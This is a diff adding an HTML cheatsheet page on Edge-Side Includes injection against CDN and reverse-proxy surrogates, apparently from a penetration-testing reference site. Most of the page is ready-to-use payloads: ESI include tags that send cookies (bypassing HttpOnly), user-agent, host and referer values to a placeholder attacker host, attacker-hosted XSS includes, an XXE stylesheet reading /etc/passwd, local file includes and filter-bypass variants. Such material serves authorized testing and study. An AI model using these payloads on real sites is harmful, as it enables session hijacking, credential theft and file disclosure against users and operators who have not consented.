@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ESI Injection · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>ESI Injection</h1><p class="cx-lede">Edge-Side Includes injection - abusing reverse-proxy and CDN surrogates to fetch arbitrary content, steal cookies, or chain to XSLT.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059</span><span class="cx-tag">D3FEND D3-MH, D3-ACH</span><span class="cx-tag">IMPACT ServerSideEval, SessionTakeover</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Edge Side Includes (ESI) are XML-style tags processed by <em>upstream</em> HTTP surrogates (Varnish, Squid, Akamai, Fastly, NodeJS proxies) rather than the application server. When the application reflects user input into a response, and the response then passes through an ESI-aware surrogate, the surrogate parses the attacker-controlled tags and acts on them.</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Detection --&gt;
+&lt;esi:include src=&quot;http://&lt;COLLAB&gt;&quot;/&gt;
+
+&lt;!-- Cookie steal (bypasses HttpOnly because ESI runs at the edge) --&gt;
+&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/?c=$(HTTP_COOKIE)&quot;/&gt;
+
+&lt;!-- Akamai debug - leaks ESI variables in response --&gt;
+&lt;esi:debug/&gt;
+
+&lt;!-- XSLT chain (when surrogate supports XSLT) --&gt;
+&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/payload.xsl&quot; dca=&quot;xslt&quot;/&gt;</code></pre></figure>
+<p>Success indicator: the ESI tag is consumed by an upstream proxy and replaced by the fetched content; or your callback is hit by a request from the surrogate's IP, not the application server's.</p>
+<h2 id="why-esi-is-its-own-bug-class">Why ESI is its own bug class</h2>
+<p>The trust boundary is unusual: the surrogate trusts the application's responses <em>as a whole</em>, including user-controlled portions. There's no way for the surrogate to know which parts of the response came from a template versus user input. An ESI tag in the response gets evaluated regardless of origin.</p>
+<p>This means:</p>
+<ul>
+<li>The bug exists in the <em>surrogate's</em> parser, but is triggered by the <em>application's</em> reflection.</li>
+<li>Cookies the application marked <code>HttpOnly</code> are accessible to ESI because the edge sees them in the request.</li>
+<li>Mitigation has to be at the surrogate (<code>&lt;esi:remove&gt;</code> filtering) or by ensuring no user input ever reaches a response served through an ESI surrogate.</li>
+</ul>
+<h2 id="detection">Detection</h2>
+<h3 id="check-headers-first">Check headers first</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -I http://&lt;TARGET&gt;/
+# Look for:
+#   Surrogate-Control: content=&quot;ESI/1.0&quot;
+#   X-Cache, X-Cache-Hits  (Varnish)
+#   X-Akamai-* (Akamai)
+#   Via: ... varnish</code></pre></figure>
+<p>Visible surrogate fingerprints don't guarantee ESI is enabled, but they tell you <em>which</em> surrogate to target.</p>
+<h3 id="blind-probe">Blind probe</h3>
+<p>When headers don't reveal the surrogate, test by injecting:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;http://&lt;COLLAB&gt;&quot;/&gt;</code></pre></figure>
+<p>If your collaborator gets a hit, ESI is processing your input. The User-Agent will tell you which surrogate (<code>Varnish/x.x.x</code>, <code>Akamai</code>, <code>Apache-HttpClient/Squid</code>, etc.).</p>
+<h3 id="where-to-inject">Where to inject</h3>
+<p>Same as any reflection-based bug:</p>
+<ul>
+<li>Search results showing "you searched for X"</li>
+<li>Profile pages echoing user-set fields</li>
+<li>Error pages echoing the requested URL or referer</li>
+<li>404 pages including the requested path</li>
+<li>Email-template previews</li>
+<li>API responses that include user-controlled fields rendered into HTML</li>
+</ul>
+<h2 id="surrogate-capability-matrix">Surrogate capability matrix</h2>
+<p>Adapted from <a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/">GoSecure's ESI research</a>:</p>
+<table>
+<thead>
+<tr>
+<th>Surrogate</th>
+<th><code>&lt;esi:include&gt;</code></th>
+<th><code>&lt;esi:vars&gt;</code></th>
+<th>Cookie access</th>
+<th>Upstream headers required</th>
+<th>Host allowlist</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Squid 3</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Varnish</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Fastly</td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Akamai ETS</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td>NodeJS <code>esi</code></td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td>NodeJS <code>nodesi</code></td>
+<td>✓</td>
+<td>-</td>
+<td>-</td>
+<td>No</td>
+<td>Optional</td>
+</tr>
+</tbody>
+</table>
+<p>Capabilities decide what attack works:</p>
+<ul>
+<li><strong>Includes</strong> - required for SSRF/exfil</li>
+<li><strong>Vars</strong> - required to access <code>$(HTTP_COOKIE)</code> etc. for cookie/header theft</li>
+<li><strong>Cookies</strong> - whether ESI sees the request's cookies</li>
+<li><strong>Upstream headers required</strong> - surrogate only processes ESI when application sends <code>Surrogate-Control: content="ESI/1.0"</code> (Varnish/Squid). If it doesn't, ESI is dormant.</li>
+<li><strong>Host allowlist</strong> - only configured hosts can be <code>src=</code> targets; restricts SSRF to whatever's whitelisted.</li>
+</ul>
+<h2 id="attack-patterns">Attack patterns</h2>
+<h3 id="ssrf-oob-confirmation">SSRF / OOB confirmation</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;http://&lt;COLLAB&gt;&quot;/&gt;</code></pre></figure>
+<p>The simplest attack. The surrogate fetches your URL - proves the bug exists, identifies the surrogate via User-Agent.</p>
+<h3 id="cookie-theft-httponly-bypass">Cookie theft (HttpOnly bypass)</h3>
+<p>When the surrogate has cookie access (Squid 3, Akamai ETS, NodeJS <code>esi</code>):</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/?c=$(HTTP_COOKIE)&quot;/&gt;</code></pre></figure>
+<p><code>$(HTTP_COOKIE)</code> is an ESI variable populated from the request's cookies. The surrogate substitutes it before fetching <code>src=</code>, so the cookie ends up in your access log.</p>
+<p>This bypasses <code>HttpOnly</code> because the JavaScript-execution model doesn't apply to surrogates - they're not browsers, just proxies that read cookies from headers.</p>
+<h3 id="other-useful-variables">Other useful variables</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/?ua=$(HTTP_USER_AGENT)&quot;/&gt;
+&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/?host=$(HTTP_HOST)&quot;/&gt;
+&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/?ref=$(HTTP_REFERER)&quot;/&gt;</code></pre></figure>
+<p>The variable syntax is <code>$(VAR_NAME)</code> for top-level access, <code>$(VAR{key})</code> for indexed access (e.g., specific cookie names).</p>
+<h3 id="reflected-xss-via-esi">Reflected XSS via ESI</h3>
+<p>When the surrogate fetches HTML and inserts it inline, the response delivered to the browser can contain attacker-controlled JavaScript:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/xss.html&quot;/&gt;</code></pre></figure>
+<p><code>xss.html</code> on your server contains the actual XSS payload. The browser receives it, runs it.</p>
+<p>This bypasses any <em>content-injection</em> filter the application might have, because the malicious content arrives via include, not via the original request.</p>
+<h3 id="xslt-chain-when-supported">XSLT chain (when supported)</h3>
+<p>Some surrogates support <code>dca="xslt"</code> to process the included resource as an XSLT transformation. This unlocks XML External Entity (XXE) attacks against the surrogate:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;http://&lt;ATTACKER&gt;/payload.xsl&quot; dca=&quot;xslt&quot;/&gt;</code></pre></figure>
+<p>Where <code>payload.xsl</code> contains:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE x [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;
+  &lt;xsl:template match=&quot;/&quot;&gt;&amp;xxe;&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre></figure>
+<p>The XSLT execution happens at the surrogate - file reads come from the surrogate's filesystem (often a different machine than the application).</p>
+<h3 id="akamai-specific-debug">Akamai-specific debug</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:debug/&gt;</code></pre></figure>
+<p>On Akamai, <code>&lt;esi:debug/&gt;</code> includes detailed ESI variables in the response - useful for understanding what's available and what's filtered.</p>
+<h3 id="private-file-inclusion-not-lfi">Private file inclusion (not LFI)</h3>
+<p>When the surrogate has file:// access:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;supersecret.txt&quot;/&gt;
+&lt;esi:include src=&quot;file:///etc/passwd&quot;/&gt;</code></pre></figure>
+<p>Less common - most surrogates restrict <code>src=</code> to HTTP. But Akamai ETS and NodeJS <code>esi</code> historically accepted local paths.</p>
+<h2 id="filter-bypass">Filter bypass</h2>
+<p>When <code>&lt;esi:</code> is filtered, alternates:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;esi:include src=&quot;...&quot;/&gt;            # standard
+&lt;ESI:include src=&quot;...&quot;/&gt;            # case (some parsers case-insensitive)
+&lt;esi : include src=&quot;...&quot;/&gt;          # space tricks</code></pre></figure>
+<p>If <code>&lt;esi:include&gt;</code> is fully filtered but the surrogate is in path, no obvious bypass - you'd need a different reflection point or a different ESI-supporting tag (<code>&lt;esi:vars&gt;</code>, <code>&lt;esi:try&gt;</code>).</p>
+<p>When the application HTML-escapes <code>&lt;</code> to <code>&amp;lt;</code>, ESI doesn't trigger. The reflection has to allow raw <code>&lt;</code> and <code>&gt;</code> for ESI to land.</p>
+<h2 id="identifying-the-surrogate">Identifying the surrogate</h2>
+<p>The User-Agent in your callback is the cleanest fingerprint. Common signatures:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>User-Agent: Varnish                                                      → Varnish
+User-Agent: Apache-HttpClient (compatible; Squid/3.x.x.x)                → Squid
+User-Agent: Mozilla/5.0 (compatible; AkamaiESI/...)                      → Akamai ETS
+User-Agent: node (esi/x.x.x)                                             → NodeJS esi</code></pre></figure>
+<p>Once identified, look up that surrogate's capability row above to know what works.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong><code>&lt;esi:include&gt;</code> reflects literally in HTML response.</strong> No ESI surrogate in path, or surrogate doesn't process this content type. Check <code>Content-Type</code> - many surrogates only parse <code>text/html</code>, so JSON/XML responses are passed through.</li>
+<li><strong>OOB callback never arrives.</strong> Surrogate has host allowlist (Varnish, Fastly, sometimes NodeSi). Your <code>src=</code> host is blocked. Try whitelisted internal hostnames; SSRF-via-ESI to internal services may still work.</li>
+<li><strong><code>$(HTTP_COOKIE)</code> returns empty or literal text.</strong> Surrogate doesn't expose cookies (Varnish, Fastly). Variables-capable surrogates only.</li>
+<li><strong>Application sends <code>Cache-Control: no-store</code>.</strong> Some surrogates skip ESI processing on uncacheable responses. The ESI tag gets passed to the browser as-is, where it's just a comment.</li>
+<li><strong>Ineffective on first request, works on subsequent.</strong> Surrogate caches the response with ESI evaluated; first request might bypass the surrogate (cache miss + processing skipped). Send 2-3 requests, check each.</li>
+<li><strong>XSLT chain returns errors.</strong> Surrogate's XSLT processor doesn't support file://, or is sandboxed. Test with HTTP fetch first (<code>&lt;xsl:include href="http://&lt;COLLAB&gt;/x.xsl"/&gt;</code>) before assuming XXE works.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>ESI Injection is rarer than its profile suggests - most modern stacks don't use ESI surrogates, and where they do (large CDNs, e-commerce platforms with edge caching), the surrogate is usually configured restrictively. When it works, the cookie-theft variant is uniquely dangerous because of the HttpOnly bypass - defenders rely on HttpOnly to make stolen-cookie risk acceptable, and ESI breaks that assumption silently.</p>
+<p>Cross-link with <a href="../../ssrf/index.html">SSRF</a> when the ESI primitive is being used for SSRF rather than cookie theft - the techniques there (filter bypass, internal discovery) apply identically once you have the include primitive.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../ssti/detection/index.html">Previous: Detection &amp; Fingerprinting</a><a class="cx-next" href="../../intermediary/ghostcat/index.html">Next: Ghostcat (CVE-2020-1938)</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
